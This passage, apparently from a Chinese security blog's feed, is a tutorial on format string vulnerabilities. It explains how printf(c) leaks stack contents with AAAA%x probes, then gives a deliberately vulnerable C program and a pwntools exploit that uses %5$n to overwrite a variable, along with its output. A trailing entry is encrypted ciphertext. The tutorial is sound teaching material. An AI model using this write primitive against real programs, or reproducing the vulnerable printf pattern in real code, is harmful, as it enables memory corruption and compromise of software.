style="text-align:center">输出</td></tr><tr><td style="text-align:center">fprintf</td><td style="text-align:center">输出到指定 FILE 流</td><td style="text-align:center">输出</td></tr><tr><td style="text-align:center">vprintf</td><td style="text-align:center">根据参数列表格式化输出到 stdout</td><td style="text-align:center">输出</td></tr><tr><td style="text-align:center">vfprintf</td><td style="text-align:center">根据参数列表格式化输出到指定 FILE 流</td><td style="text-align:center">输出</td></tr><tr><td style="text-align:center">sprintf</td><td style="text-align:center">输出到字符串</td><td style="text-align:center">输出</td></tr><tr><td style="text-align:center">snprintf</td><td style="text-align:center">输出指定字节数到字符串</td><td style="text-align:center">输出</td></tr><tr><td style="text-align:center">vsprintf</td><td style="text-align:center">根据参数列表格式化输出到字符串</td><td style="text-align:center">输出</td></tr><tr><td style="text-align:center">vsnprintf</td><td style="text-align:center">根据参数列表格式化输出指定字节到字符串</td><td style="text-align:center">输出</td></tr><tr><td style="text-align:center">setproctitle</td><td style="text-align:center">设置 argv</td><td style="text-align:center">输出</td></tr><tr><td style="text-align:center">syslog</td><td style="text-align:center">输出日志</td><td style="text-align:center">输出</td></tr><tr><td style="text-align:center">err, verr, warn, vwarn 等</td><td style="text-align:center">……</td><td style="text-align:center">输出</td></tr></tbody></table><h3 id="font-colornavy0x02-格式化字符串漏洞原理font"><a class="markdownIt-Anchor" href="#font-colornavy0x02-格式化字符串漏洞原理font"></a> <font color="navy"><code>0x02 格式化字符串漏洞原理</code></font></h3><p>      在<code>Q1</code>中我们已经介绍了什么是格式化字符串，并且用例子也进一步说明，那么现在主要介绍一下格式化字符漏洞原理：格式化字符串函数是根据格式化字符串函数来进行解析的。<strong>那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制</strong>，所以当prinf函数没有格式化字符串时，我们可以通过输入控制字符来泄露内存信息，用下面的代码为例：</p><blockquote><p>正常应该这样写：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// code1</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;        </span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">6</span>,b=<span class="number">20</span>;</span><br><span class="line">    <span class="keyword">char</span> c[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, &amp;a);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,c);</span><br><span class="line">    <span class="keyword">if</span>(a = <span class="number">8</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Success"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Fail"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>正常结果为</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello World!</span><br><span class="line">Fail</span><br></pre></td></tr></table></figure><blockquote><p>由于开发者的粗心或者偷懒，将上述代码写成如下所示：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// code2</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;        </span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">6</span>,b=<span class="number">20</span>;</span><br><span class="line">    <span class="keyword">char</span> c[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, &amp;a);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,c);</span><br><span class="line">    <span class="built_in">printf</span>(c);</span><br><span class="line">    <span class="keyword">if</span>(a == <span class="number">8</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Success"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Fail"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>有一位大佬执行该程序后，输出的结果却是：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\xd8\x16\xfa\xffaaaaSuccess</span><br></pre></td></tr></table></figure><blockquote><p>我们就以这个简单的例子入手，来梳理和讲解格式化字符串漏洞原理。</p></blockquote><h4 id="font-color-blueq1printfsc和printfc有什么区别font"><a class="markdownIt-Anchor" href="#font-color-blueq1printfsc和printfc有什么区别font"></a> <font color="blue"><code>Q1：printf(&quot;%s&quot;,c);和printf(c);有什么区别？</code></font></h4><p><img src="/images/119-2.jpg" alt></p><p>      这里主要看stack中的情况，其中左边的是<code>printf(&quot;%s&quot;,c);</code>语句，右边是<code>printf(c);</code>语句，从code中可以看出 printf 函数的<code>arg[0]</code>（格式化字符串）的地址并不一样，但是从 <code>stack</code> 中可以看到 esp 的地址，也就是两种情况格式化字符串在栈中的存储地址都是<code>0xffffd8a0</code>，由此可以看出</p><ul><li><code>printf(&quot;%s&quot;,c);</code>的格式化字符串为<code>%s</code></li><li><code>printf(c);</code>的格式化字符串为我们输入的<code>AAAA%x.%x.%x.%x.%x.%x.%x</code>，在这里我们可以把<code>printf(c);</code>当作<code>printf(&quot;AAAA%x.%x.%x.%x.%x.%x.%x&quot;);</code>后续参数被省略掉，也就是说格式化字符串要打印的参数有<code>7</code>个，所以从格式化字符串的地址依次<code>+4</code>，则打印的参数地址为<code>esp+0x4</code>、<code>esp+0x8</code>、<code>esp+0xc</code>、<code>esp+0x10</code>、<code>esp+0x14</code>、<code>esp+0x18</code>、<code>esp+1c</code>，那么对于上图中的例子，输出的结果为：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：AAAA%x.%x.%x.%x.%x.%x.%x</span><br><span class="line">输出：AAAAffffd8b4.0.8049189.f7fb33fc.41414141.252e7825.78252e78</span><br><span class="line">Fail</span><br></pre></td></tr></table></figure><p>       上述结果分别对应：</p><table><thead><tr><th style="text-align:center">栈顶偏移</th><th style="text-align:center">格式化字符串参数</th><th style="text-align:center">函数参数</th><th style="text-align:left">栈中地址</th><th style="text-align:center">输出结果</th></tr></thead><tbody><tr><td style="text-align:center">esp</td><td style="text-align:center">格式化字符串</td><td style="text-align:center">1</td><td style="text-align:left">0xffffd8a0 --&gt; 0xffffd8b4</td><td style="text-align:center">AAAA</td></tr><tr><td style="text-align:center">esp+0x4</td><td style="text-align:center">1</td><td style="text-align:center">2</td><td style="text-align:left">0xffffd8a4 --&gt; 0xffffd8b4</td><td style="text-align:center">ffffd8b</td></tr><tr><td style="text-align:center">esp+0x8</td><td style="text-align:center">2</td><td style="text-align:center">3</td><td style="text-align:left">0xffffd8a8 --&gt; 0x0</td><td style="text-align:center">0</td></tr><tr><td style="text-align:center">esp+0xc</td><td style="text-align:center">3</td><td style="text-align:center">4</td><td style="text-align:left">0xffffd8ac --&gt; 0x8049189</td><td style="text-align:center">8049189</td></tr><tr><td style="text-align:center">esp+0x10</td><td style="text-align:center">4</td><td style="text-align:center">5</td><td style="text-align:left">0xffffd8b0 --&gt; 0xf7fb33fc</td><td style="text-align:center">f7fb33fc</td></tr><tr><td style="text-align:center">esp+0x14</td><td style="text-align:center">5</td><td style="text-align:center">6</td><td style="text-align:left">0xffffd8b4 (“AAAA”)</td><td style="text-align:center">41414141</td></tr><tr><td style="text-align:center">esp+0x18</td><td style="text-align:center">6</td><td style="text-align:center">7</td><td style="text-align:left">0xffffd8b8 (&quot;%x.%&quot;)</td><td style="text-align:center">252e7825</td></tr><tr><td style="text-align:center">esp+0x1c</td><td style="text-align:center">7</td><td style="text-align:center">8</td><td style="text-align:left">0xffffd8bc (“x.%x”)</td><td style="text-align:center">78252e78</td></tr></tbody></table><h4 id="font-color-blueq2为什么要输入aaaaxxxxxxxfont"><a class="markdownIt-Anchor" href="#font-color-blueq2为什么要输入aaaaxxxxxxxfont"></a> <font color="blue"><code>Q2：为什么要输入AAAA%x.%x.%x.%x.%x.%x.%x?</code></font></h4><p>      在了解为什么要输入这个字符串之前，我们先来看看在运行程序时，局部变量存储的位置，这里就要清楚运行时栈的情况，如下图：</p><p><img src="/images/119-3.jpg" alt></p><p>      从上图可以看出，<strong>局部变量被存储在栈中</strong>（这里要说明的是全局变量被存储在.data段中），这里还是用<code>code2</code>的代码作为例子，看看<code>main</code>函数中变量 a、b 和 c 存放的位置，通过gdb进行调试，首先来确定变量 a 和 b 的位置，如下图：</p><p><img src="/images/119-4.png" alt></p><p>      下面我们再来寻找 c 的位置，如下图：</p><p><img src="/images/119-5.png" alt></p><p>      从上图中得信息可以得出局部变量 a、b 和 c 在栈中的情况，如下图：</p><p><img src="/images/119-6.png" alt></p><p><code>printf(&quot;%s&quot;,c); + 输入：AAAAAAAAAAAAAAAAAAAA</code></p><p>      下面我们先来看看如果遇到正常的输出<code>printf(&quot;%s&quot;,c);</code>，看看栈中的情况（输入字符串“AAAAAAAAAAAAAAAAAAAA”的前提下）如下图：</p><p><img src="/images/119-7.png" alt></p><blockquote><p>输出结果为<code>AAAAAAAAAAAAAAAAAAAA</code>。从上图和结果可以看到esp处的是<code>格式化字符串</code>，里面只有一个控制字符<code>%s</code>，所以格式化字符串只有一参数，位于<code>esp+0x4</code> 处，那么输出的结果就是<code>esp+4</code>指向地址所对应的值<code>AAAAAAAAAAAAAAAAAAAA</code>。</p><p>注：这里有一点需要注意，任意的内存的读取需要用到格式化字符串 <strong>%s</strong>，其对应的参量是一个指向字符串首地址的指针，作用是输出这个字符串。<sup>[4]</sup></p></blockquote><p><code>printf(c); + 输入：AAAAAAAAAAAAAAAAAAAA</code></p><p>      下面我们先来看看如果遇到<code>printf(c);</code>，看看栈中的情况（输入字符串“AAAAAAAAAAAAAAAAAAAA”的前提下）如下图：</p><p><img src="/images/119-8.png" alt></p><blockquote><p>输出结果为<code>AAAAAAAAAAAAAAAAAAAA</code>，虽然这里也是输出20个重复的A，但是和上面的情况完全不一样，这里是因为格式化字符串中没有控制符，所以只将格式化字符串输出，这里一定要分清。</p><p>那再想一想，因为格式化字符串是我们的输入，如果我们在输入中加入控制符，比如%x、%p、%n等，那么我们是不是就可以泄露栈上的信息呢？不懂的话下面来一个例子，也就回到了我们这个小问题上<code>为什么要输入AAAA%x.%x.%x.%x.%x.%x.%x</code>？首先来简单的分析一下：</p><ul><li>因为我们输入的是 c 的值，c 是局部变量，所以输入的内容被分配在栈上</li><li>因为<code>printf(c);</code>函数中没有格式化字符串，只有一个参数 s，所以printf把<code>s</code>地址中的内容当作第一个参数，也就是printf函数的格式化字符串</li><li>因为我们的输入含有<code>7</code>个控制符<code>%x</code>，所以相当于printf函数的有<code>7</code>个<strong>格式化字符串参数</strong>（注意是格式化字符串参数，不是函数参数），所以我们可以将后面7个连续地址都打印出来</li><li>因为我们能控制的只有 c 的输入，所以我们可以通过<code>AAAA%x.%x.%x.%x.%x.%x.%x</code>来查找 c 的起始地址（也可以说成参数偏移），从而可以进一步利用我们的输入来改相应的值</li></ul></blockquote><h4 id="font-color-blueq3利用格式化字符串漏洞能做什么fontsup3sup"><a class="markdownIt-Anchor" href="#font-color-blueq3利用格式化字符串漏洞能做什么fontsup3sup"></a> <font color="blue"><code>Q3：利用格式化字符串漏洞能做什么?</code></font><sup>[3]</sup></h4><p>      通过对格式化字符串漏洞的利用，可以实现如下功能：</p><ul><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_2" target="_blank" rel="noopener">程序崩溃</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_3" target="_blank" rel="noopener">泄露内存</a><ul><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_4" target="_blank" rel="noopener">泄露栈内存</a><ul><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_5" target="_blank" rel="noopener">获取栈变量数值</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_6" target="_blank" rel="noopener">获取栈变量对应字符串</a></li></ul></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_7" target="_blank" rel="noopener">泄露任意地址内存</a></li></ul></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_8" target="_blank" rel="noopener">覆盖内存</a><ul><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_9" target="_blank" rel="noopener">覆盖栈内存</a><ul><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_9" target="_blank" rel="noopener">覆盖栈内存</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_9" target="_blank" rel="noopener">覆盖栈内存</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_12" target="_blank" rel="noopener">进行覆盖</a></li></ul></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_13" target="_blank" rel="noopener">覆盖任意地址内存</a><ul><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_14" target="_blank" rel="noopener">覆盖小数字</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit-zh/#_15" target="_blank" rel="noopener">覆盖大数字</a></li></ul></li></ul></li></ul><h3 id="font-color-navy0x03-例题探析font"><a class="markdownIt-Anchor" href="#font-color-navy0x03-例题探析font"></a> <font color="navy"><code>0x03 例题探析</code></font></h3><blockquote><p>这里还是以code2中的代码为例：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// code2</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;        </span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">6</span>,b=<span class="number">20</span>;</span><br><span class="line">    <span class="keyword">char</span> c[<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, &amp;a);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,c);</span><br><span class="line">    <span class="built_in">printf</span>(c);<span class="comment">// 存在格式化字符串漏洞</span></span><br><span class="line">    <span class="keyword">if</span>(a == <span class="number">8</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Success\n"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Fail\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1-编译"><a class="markdownIt-Anchor" href="#1-编译"></a> <code>① 编译</code></h4><p>      为了简单的进行格式化字符串漏洞，在编译时将保护关闭掉：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -no-pie -o format_string format_string.c</span><br></pre></td></tr></table></figure><h4 id="2-确定数组-c-在栈中相对于格式化字符参数序列"><a class="markdownIt-Anchor" href="#2-确定数组-c-在栈中相对于格式化字符参数序列"></a> <code>② 确定数组 c 在栈中相对于格式化字符参数序列</code></h4><p>      为了确定数组 c 是格式化字符串的参数个数，这里需要通过我们的输入进行泄露，运行程序，并且输入：<code>AAAA%x.%x.%x.%x.%x.%x.%x</code>，查看运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAAff920694.0.8049189.f7f0c3fc.41414141.252e7825.78252e78Fail</span><br></pre></td></tr></table></figure><p>      因为“AAAA“的十六进制为”41414141“，所以我们可以判断数组 c 是格式化字符串的第 <code>5</code> 个参数，是printf函数的第 <code>6</code> 个参数，如图：</p><p><img src="/images/119-9.jpg" alt></p><blockquote><p>根据上图，我们简单的来画一下此时栈中的示意图：</p></blockquote><p><img src="/images/119-10.jpg" alt></p><h4 id="3-改变变量-a-的值"><a class="markdownIt-Anchor" href="#3-改变变量-a-的值"></a> <code>③ 改变变量 a 的值</code></h4><p>      由于目前几乎上所有的程序都开启了 aslr 保护，所以栈的地址一直在变，所以我们这里故意输出了 c 变量的地址。<sup>[3]</sup>在这里我们想一想怎么才能改变 c 的值呢？让我们一步一步的深入研究：</p><blockquote><ol><li>我们已经知道了栈中的情况，以及变量 c 相对于格式化字符串的参数序列（第5个参数），而且我们能控制的输入只有 c，所以我们要想办法要通过对 c 的输入，向 a 地址写入我们想要输入的值</li></ol><p><br>2)  如何实现这一目标呢？这里需要用到一个控制字符 <code>%n</code> 和 <code>%length$x</code></p><ul><li><code>%n</code>：不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量；</li><li><code>%n$x</code>：<strong>可以直接获取栈中被视为printf函数第 n+1 个参数的值</strong></li></ul></blockquote><p>      我们已经确定了数组 c 的地址位置相当于格式化字符串的第 <code>5</code> 个参数，所以我们要在数组 c 的首地址写入 a 的地址，然后使用<code>%5$n</code> 向该地址写入 8，由于 a 的地址长度为 4，所以我们只需要在 <code>%5$n</code> 前面填充 <code>4</code> 个字符，这样输出的字符串长度为 <code>8</code>，那么 <code>%5$n</code> 就会将 <code>8</code> 赋值给格式化字符串的第 <code>5</code> 个参数所指向的地址，也可以将此构造（不唯一）格式进行统一：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[address][padding][%len$n]</span><br></pre></td></tr></table></figure><p>      根据上述分析，我们可以构造如下payload：<code>a_addr + &quot;aaaa&quot; + &quot;%5$n&quot;</code>，则完整的 exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">"./printf_test2"</span>)</span><br><span class="line">a_addr = int(sh.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">payload = str(p32(a_addr),encoding=<span class="string">"unicode_escape"</span>) + <span class="string">"aaaa"</span> + <span class="string">"%5$n"</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">print(<span class="string">"[+] result is:"</span>,sh.recvuntil(<span class="string">"\n"</span>))</span><br><span class="line">print(<span class="string">"[+] a_value is:"</span>,str(sh.recv(),encoding=<span class="string">"unicode_escape"</span>))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>      输出结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Documents/CTF/PWN/Test# python3 printf_test2_exp.py </span><br><span class="line">[+] Starting local process &apos;./printf_test2&apos;: pid 2187</span><br><span class="line">[+] result is: b&apos;\xa8\xaa\x9f\xffaaaaSuccess\n&apos;</span><br><span class="line">[+] a_value is: 8</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Process &apos;./printf_test2&apos; stopped with exit code 0 (pid 2187)</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure><blockquote><p>从上述结果中的“success”，以及 a 的值中可以分析出，我们已经成功的将 a 的值改为了 <code>8</code>，这个时候栈中的情况如下示意图：</p></blockquote><p><img src="/images/119-11.png" alt></p><blockquote><p>这里要注意：</p><p>      我们不能直接在命令行输入 <code>\xa8\xaa\x9f\xffaaaa%5$n</code> 这是因为虽然前面的确实是 a 的地址，但是，scanf 函数并不会将其识别为对应的字符串，而是会将 <code>\</code>、<code>x</code>、<code>a</code>、<code>8</code>，所以要用pwntool工具。</p></blockquote><h3 id="font-color-navy0x04-referencesfont"><a class="markdownIt-Anchor" href="#font-color-navy0x04-referencesfont"></a> <font color="navy"><code>0x04 References</code></font></h3><p>[1] <a href="https://zhuanlan.zhihu.com/p/94614529" target="_blank" rel="noopener">CWE和CVE及其关系</a></p><p>[2] <a href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2" target="_blank" rel="noopener">格式化字符串</a></p><p>[3] <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_intro-zh/" target="_blank" rel="noopener">格式化字符串漏洞原理介绍</a></p><p>[4] <a href="https://blog.csdn.net/qq_43394612/article/details/84900668" target="_blank" rel="noopener">格式化字符串漏洞原理详解</a></p><p>[5] <a href="https://www.cnblogs.com/0xJDchen/p/5904816.html" target="_blank" rel="noopener">详谈Format String（格式化字符串）漏洞</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x00-前言font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-前言font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00 前言&lt;/c
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="二进制" scheme="https://muzibing.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>学习计划表</title>
    <link href="https://muzibing.github.io/2020/05/25/2020.05.24%EF%BC%88118%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/05/25/2020.05.24（118）/</id>
    <published>2020-05-24T16:00:00.000Z</published>
    <updated>2020-06-03T12:58:06.471Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="a7323a8a4eeaee41383701714f06c2863548ae8d270883536ed416d6fbba9b51">9b35bc5d657db7046bbe81d6b7730b9fdadb0066e66704b48261b29ef56eb7078a473e7e800bb8c995cc6339128c9020f1b17a4b6bbfcdd7560d4cf69b7650947ebb2ec01aa5bc9b69b27c9a122f4c1e95eaabc86baa6bc660982494c14004f31101a78b0c81eee7d788d52742178523784c993357b69f56027657988b1c50c2bb499db84363c2444f1491f89eccce600640f71cc887d5b0abfc3fb8ec230191bf1e7a5762412e9359d976e3e7b2b7e79b4aebaac8866a98ba2648ba510954c555822f4439d6f1c8f02844964ff517d43af647e351074e873a52013844ec275dab5dd233f940e5e4c7eb5198c4f0c0f7d6cd7c181b7b75fbdebf2a5ea7fa39374519f23e434081611dc79ce2498b46234709a8792d630c0045455cc26971ad262b5480280444e3a9683a240ec5b020283dc4344d47057fde202859b2b9dbafc07bf2d317fb50fac2a57b2ebde182b4d7ca8d3164cea4aa5fb23678696f3b9307bd64d35db1dc1291f3e0adfe0f65b235bdc2679ee7cc7958013a6948eddfb87d358067dc9c7f5806fd344479dc528db1f24d280dc4850f9d76a4e062278f6d5290b09f418fa9ef145da1ada4c8f9dd730db4325419418ca51b26cf0700bbb018a784a821eaa5f694b29a51ad1dfee7841c65c63ee98493254fd0060d0e5b5e9e8be4f79d172e9794a1afcb3601c48e2aaeabc99be61403b39e19358fbafbe301b742e1dd4ed172f8935fdf82ea2d7d778901c7303a0a7112d0c5618a31efcad61425b62e44b04cb7a399d7d6f4a1ad54f5a175f121ae9e1c622b12bc7ee59b87c03b9d5310d4ce3289fb2cd98f763b8ef18cd262531706a0a7c88a2f9908e967cbae0b1aeee1755fd5eb077a1c19a9b65d463a51e972b9d96e1974cfcde752a75de4b29a042a8ecbe86237704d8fb54074cff4c7b962a2cc428790a256a231ddab66b0d64b0342596269eb1b06df4cc60183f6e47dd3810be32ed142ecae91fcb095b3a3f9f2a6bae5856327427a68155396a0aaf0238c64f72b81f6317b4bb5826e8b6cfe237442e00a7ea42a3f8c3ef1d3a4a49f0264e099dfe8cff254a6e12115912c095ec7db32270c0d83a8dddc95019aa0026d68965f595e9cc30097a396099e0205be86d15a26380942d0c0e080ff86e35786d8b4fc404be4e7680e3e67122aec0c836b3495377f299b547b9fb781db07accddf2506db6989807e78431e1182a4cea8baf24fd7052a4925f02f8967da55f87710dae768e2a8dea3d606f67e9271304d2bf9b3dd289f0da2e1651824edcf7e29b7970690b3c39091940ce423973b4ea839b354203ce596dff90230fa2ea91323ef063eba3d417d2ee03e5b6a982e6cbc20bf885a0ff6db4b27f77de6428bfc31c46044afb1c58d61312d696744aa12144c50f11c3e29bd387576447039344f47b9f618bf7b55c6776a14af73d0ac9a88ad155c5a358d49e1039c564d7d61936d3d98feee6ec8541e7a3865cd7e778c5de9263cce52b83f60f3c7fc073bbd718fd701b37a895fc877c3d2b2e38077e97f5f7b671b66cf33afc89f420d82b7524f75a7cf2e811cba3adc5e00f04a01b3e5596bc933a5cf55e290bb9260d490bbff8075670f89d5f91d81766b9ec14684a0534713ca43e50182efd208165795fb9100b71937c16d038cb6797ce8656ccc67150e4222a0f99cf5aad7f8952339c5bd73ace394ac4a40ef542b6340d1b7a13dc5026cbe8c29dbae3b91bc4d6492b352241c98ead1eeffe5ce25f9308d80a314295c60896ad6457c9058ed19f887ba3d747f5b3d508de270dd01acced5780ac795a2964642fd4b5b6c9de8389b5708945ad742ff8abe82900ef1783435aab296f7a71c9f1188be9bd4e330f378064e2b7d1361b167d52d3d1e4ca5d3aa4703c83806b94619c4e3e16eb911800ea6343372bb8a8f292db93e8deebbcf7632e3753dde1d2127d6df10131e5939f9e3527502c0150509e558b3b1b4530a694d8e33ba6eacfb6e1a401cf22d627bbda6bb15c3f4d02853ef403ee5ff0fddd154fbfe7cc3ba42de80c11570ec41f0a7b7a4c46e359abbb2125dfdcd29d44d723e4be11fbed969404aa2a50363d5881e316a3a953b90bff775e0e20a2a71595af2238e6678203d7a2c187540f75aa7c55e1d95eeb42ec5ed7ddd6da70b831370d73decbb0698f7cd4f8c5fc079f3bd054730bba8d31a06129f4fae3f41212a5111430ea35fd04803e76528a777f5b5c49e4897a29e7fea747ae49e6f98e0f56d76af3662e5150486ba5a5efaed8b7edee227a05b5e6f0f18bafb7f3faae19b5d518cb47b8583d7b52a075a614431265ed3be35c6ce149dd8865de784132efedd94641d10341e6ff07a837fc9a272c62021197799965044bdc3990e12f07d7dc21d7af5f11b0b6a5b19fff77f74e1dee10df106a8f3cf22b83c4f61fd931191983e2406ccd98d98905d607ab9d246a5382aacda3d2a10e22ca6598aba8e9f5f14f79b45c67cd41bf9a6e4d735c71595d7ca6b8760f49db4e6ad89383cb58af92aae2dbf177acbaeb5ba66a57852c8dcd9e3849cc26bb1e4f66649da0631d62291f1865a384fe5c2a8320b256c0c3dc267403c56d50144d0972fe458ea6d7648dac2d8de91183478c948c4d30521c421f858f204419a4f43816d13e3c4d7cde0ca15ffb2e485dbcd0c98c328eb4e723ad3d2c6f5c0ea4420da7461d4ac22d970b80cfb2da85853029009622c9b0b515de5489bee77bba4793f818731f48593a39abdb09549bf26e8091d4fc3a059f761b804349d374ea8a543d4527cc26acf1845bf2c9c0b4904b01d3ca1af2a61ba2a9bd11c9bb92b863866ab76bbcc7c8a6fd82ee4d1307d64aae1fdf9933aab586f51b704e9704ff752459c9df9a3f0feaa00fbc2219f95ac52e4ac8